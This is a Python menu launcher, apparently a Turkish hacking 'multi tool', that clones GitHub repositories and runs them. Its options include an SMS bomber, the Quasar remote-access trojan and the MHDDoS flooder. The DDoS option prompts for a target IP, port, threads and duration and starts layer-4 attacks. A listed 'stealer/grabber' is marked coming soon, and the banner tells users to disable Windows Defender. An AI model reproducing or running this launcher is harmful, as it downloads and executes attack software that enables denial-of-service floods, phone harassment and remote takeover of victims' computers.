from colorama import Fore
from os import system
import os
from time import sleep
import subprocess
import wget
import platform



system("title Multi Tool  by @zupppe")
# KLASÖRLER
domain = "domain-checker"
txt = "http.txt"
fileddos = "files"
proxies = "proxies"
ddos = "MHDDoS"
docs = "google-docs-bot"
ipsorgu = "ipsorgu"
tool ="tools"
emp = "empyrean"
bomb = "erenbomb"
quasar = "quasar"
git_exe = "Git-2.47.1-64-bit.exe"
# ---------------------------------------------------------------------------------------------------------------------------------------------
sil = lambda: system("cls||clear")
calisantoolsayisi = 7
dark = Fore.LIGHTBLACK_EX
red = Fore.RED
# -------------------------------------------git-------------------------------------------------------------------------------------------------
sil()
try:
    result = subprocess.run(["git", "--version"], check=True, text=True, capture_output=True)
    print(red + "Git versiyonu:", result.stdout)
    sleep(0.00000000000001)
    sil()
except FileNotFoundError as e:
    print(red + "Hata: Git yüklü değil veya sistemde bulunamıyor!")
    sleep(5)
    system_bits = platform.architecture()[0]
    print(f"İşletim sistemi: {system_bits}")
    if system_bits == ("64bit"):
        sil()
        print(red + "Dosyalar Yükleniyor Lütfen Bekleyiniz")
        wget.download("https://github.com/git-for-windows/git/releases/download/v2.47.1.windows.1/Git-2.47.1-64-bit.exe")
        sil()
        system("start Git-2.47.1-64-bit.exe")
        sil()
    elif system_bits == ("32bit"):
        sil()
        print(red + "Dosyalar Yükleniyor Lütfen Bekleyiniz")
        wget.download("https://github.com/git-for-windows/git/releases/download/v2.47.1.windows.1/Git-2.47.1-32-bit.exe")
        system("start Git-2.47.1-32-bit.exe")
        sil()
    else:
        system("start kurulum.bat")
except subprocess.CalledProcessError as e:
    print(red + "Hata: Git komutu çalıştırılırken bir sorun oluştu!")
    sleep(5)
    system("exit")
#
sil()
isim_sorusu = input("""{}
                    
                    
                            
                    
                    
                                                    
                                            
                                                
                    
                                                    Enter Username : 
                    
                                            ----->{}    """.format(red, dark))
sil()
if os.path.isdir(tool):
    sil()
else:
    os.mkdir(tool)
    sil()
def ekran():
    print(red + """
      
     __    __     __  __     __         ______   __        ______   ______     ______     __        │ Working tools:
    /\ "-./  \   /\ \/\ \   /\ \       /\__  _\ /\ \      /\__  _\ /\  __ \   /\  __ \   /\ \       │       {}{}{}  
    \ \ \-./\ \  \ \ \_\ \  \ \ \____  \/_/\ \/ \ \ \     \/_/\ \/ \ \ \/\ \  \ \ \/\ \  \ \ \____  │────────────────   
     \ \_\ \ \_\  \ \_____\  \ \_____\    \ \_\  \ \_\       \ \_\  \ \_____\  \ \_____\  \ \_____\ │ Account Name:  
      \/_/  \/_/   \/_____/   \/_____/     \/_/   \/_/        \/_/   \/_____/   \/_____/   \/_____/ │  {}{}{}
                                                                                                    │────────────────   
                                you need to close your defender for some tools                      │  by {}@zupppe{}
                                                                                                    │──────────────── 
                                                                                                    │ {}Settings: {}!{}
                                                                              
                                                                              
╔═══                              ═══╗ ╔═══                               ═══╗ ╔═══                                 ═══╗
║   ({}01{}){} > STEALER/GRABBER{}           ║ ║   ({}10{}){} > N/A{}                        ║ ║   ({}19{}){} > N/A{}                          ║
    ({}02{}){} > SMS BOMBER{}                      ({}11{}){} > N/A{}                              ({}20{}){} > N/A{}
    ({}03{}){} > QUASAR RAT TOOL{}                 ({}12{}){} > N/A{}                              ({}21{}){} > N/A{}
    ({}04{}){} > IP LOOKUP{}                       ({}13{}){} > N/A{}                              ({}22{}){} > N/A{}
    ({}05{}){} > GOOGLE DOCS FORM BOT{}            ({}14{}){} > N/A{}                              ({}23{}){} > N/A{}
    ({}06{}){} > L4/L7 DDOS TOOL{}                 ({}15{}){} > N/A{}                              ({}24{}){} > N/A{}
    ({}07{}){} > DOMAIN CHECKER{}                  ({}16{}){} > N/A{}                              ({}25{}){} > N/A{}
    ({}08{}){} > N/A{}                             ({}17{}){} > N/A{}                              ({}26{}){} > N/A{}
║   ({}09{}){} > N/A{}                       ║ ║   ({}18{}){} > N/A{}                         ║ ║  ({}27{}){} > N/A{}                          ║
╚═══                              ═══╝ ╚═══                                ═══╝ ╚═══                                ═══╝
""".format(
    dark, calisantoolsayisi, red,
    dark, isim_sorusu, red,
    dark, red,
    red, dark, red,
    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red
))
def secim():
    secim_soru = input("""

{}──────>{}  """.format(red, dark))
# ----------------------------------------------------------------------------------------------------------------------------------------------
    if secim_soru == ("1") or secim_soru == ("01"):
        sil()
        print(red + "YAKINDA..")
        sleep(2)
        sil()
        ekran()
        secim()
    elif secim_soru == ("2") or secim_soru == ("02"):
        sil()
        os.chdir(tool)
        if os.path.isdir(bomb):
            os.chdir(bomb)
            system("python erenbomb.py")
        else:
            sil()
            system("git clone https://github.com/vHzEren/erenbomb.git")
            sil()
            os.chdir(bomb)
            system("pip install -r requirements.txt")
            sil()
            system("python erenbomb.py")
    elif secim_soru == ("3") or secim_soru == ("03"):
        sil()
        os.chdir(tool)
        if os.path.isdir(quasar):
            os.chdir(quasar)
            system("start Quasar.exe")
            sil()
            ekran()
            secim()
        else:
            sil()
            system("git clone https://github.com/vHzEren/quasar.git")
            sil()
            os.chdir(quasar)
            system("start Quasar.exe")
            ekran()
            secim()
    elif secim_soru == ("4") or secim_soru == ("04"):
        sil()
        os.chdir(tool)
        if os.path.isdir(ipsorgu):
            os.chdir(ipsorgu)
            sil()
            system("python ipsorgu.py")
        else:
            sil()
            system("git clone https://github.com/vHzEren/ipsorgu.git")
            os.chdir(ipsorgu)
            system("start module_install.bat")
            system("python ipsorgu.py")
    elif secim_soru == ("5") or secim_soru == ("05"):
        sil()
        os.chdir(tool)
        if os.path.isdir(docs):
            sil()
            os.chdir(docs)
            system("python docs-bot.py")
        else:
            sil()
            system("git clone https://github.com/vHzEren/google-docs-bot.git")
            sil()
            system("pip install selenium")
            sil()
            os.chdir(docs)
            system("python docs-bot.py")
    elif secim_soru == ("6") or secim_soru == ("06"):
        os.chdir(tool)
        sil()
        if os.path.isdir(ddos):
            os.chdir(ddos)
            layer_soru = input("LAYER7/LAYER4: ").lower()
            if layer_soru == ("layer4"):
                sil()
                layer4_method = input(red + """ 
    - Layer4
| CHAR, MCBOT, TCP, UDP, ICMP, CLDAP, VSE, TS3, RDP, MCPE, CPS, ARD, NTP, CONNECTION, FIVEM, MEM, MINECRAFT, DNS, SYN | 19 Methods
                                      
            Method türünü yazınız
        -----> {}""".format(dark)).upper()
                sil()
                ip_adress = input(red + "Hedef ip adresini giriniz: {}".format(dark))
                sil()
                port = input("{}4 basamaklı bir port adresi giriniz (önerilen=1080):{} ".format(red, dark))
                sil()
                threads_layer4 = input("""
                                    {}!! UYARI !! YÜKSEK SAYILAR İŞLEMCİNİZİ ZORLAR !!
                                            Threads sayısı giriniz: {}""".format(red, dark))
                sil()
                zaman_layer4 = input("{}Saniye olarak zaman belirleyiniz: {}".format(red, dark))
                system("python start.py {} {}:{} {} {} http.txt".format(layer4_method, ip_adress, port, threads_layer4, zaman_layer4))
            elif layer_soru == ("layer7"):
                sil()
                print(red + "YAKINDA..")
            else:
                sil()
                ekran()
                secim()
        else:
            system("git clone https://github.com/MatrixTM/MHDDoS.git")
            os.chdir(ddos),
            system("pip install requirements.txt")
            sil()
            os.chdir(fileddos)
            os.chdir("..")
            os.chdir("..")
            sil()
            print("{}DDos tooluna tekrardan giriniz.. by {}@zupppe".format(red, dark))
            sleep(5)
            sil()
            ekran()
            secim()
    elif secim_soru == ("7") or secim_soru == ("07"):
        os.chdir(tool)
        sil()
        if os.path.isdir(domain):
            os.chdir(domain)
            sil()
            system("python domain-checker.py")
        else:
            system("pip install socket")
            system("git clone https://github.com/zupppe/domain-checker.git")
            sil()
            os.chdir(domain)
            system("python domain-checker.py")
    elif secim_soru == ("8") or secim_soru == ("08"):
        sil()
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("9") or secim_soru == ("09"):
        sil()
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("10"):
        sil()
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("11"):
        sil()
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("12"):
        sil()
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("13"):
        sil()
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("14"):
        sil()
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("15"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("16"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("17"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("18"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("19"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("20"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("21"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("22"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("23"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("24"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("25"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("26"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()
    elif secim_soru == ("27"):
        sil()
        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
        sleep(5)
        sil()
        ekran()
        secim()

    elif secim_soru == ("!"):
        sil()
        def tema_sec():
            global red, dark
            print("""
{}                              ╔═══               ═══╗
{}                              ║                     ║
{}                                ({}1{}){} > RED{}                  
{}                                ({}2{}){} > GREEN{}
{}                                ({}3{}){} > PURPLE{}
{}                                ({}4{}){} > YELLOW{}
{}                                ({}5{}){} > CYAN{}
{}                                ({}6{}){} > BLUE{}
{}                                ({}7{}){} > WHITE{}
{}                                ({}8{}){} > RAINBOW{}
{}                              ║                     ║
{}                              ╚═══               ═══╝
            """.format(
red,
red,
red, dark, red, dark, red,
red, dark, red, dark, red,
red, dark, red, dark, red,
red, dark, red, dark, red,
red, dark, red, dark, red,
red, dark, red, dark, red,
red, dark, red, dark, red,
red, dark, red, dark, red,
red,
red   
            ))
    
            secim = input("{}──────>{}  ".format(red, dark))

            if secim == "1":
                red = Fore.RED
            elif secim == "2":
                red = Fore.LIGHTGREEN_EX
            elif secim == "3":
                red = Fore.LIGHTMAGENTA_EX
            elif secim == "4":
                red = Fore.YELLOW
            elif secim == "5":
                red = Fore.LIGHTCYAN_EX
            elif secim == "6":
                red = Fore.BLUE
            elif secim == "7":
                red = Fore.WHITE
        tema_sec()
        sil()
        ekran()
        secim()
    else:
        sil()
        print("{}Hatalı bir seçenekte bulundunuz. Lütfen bir rakam giriniz.. {}@zupppe".format(red, dark))
        sleep(3)
        sil()
        ekran()
        secim()
# --------------------------------------------------CODE--------------CODE--------------CODE---------------------CODE---------------------------
ekran()
secim()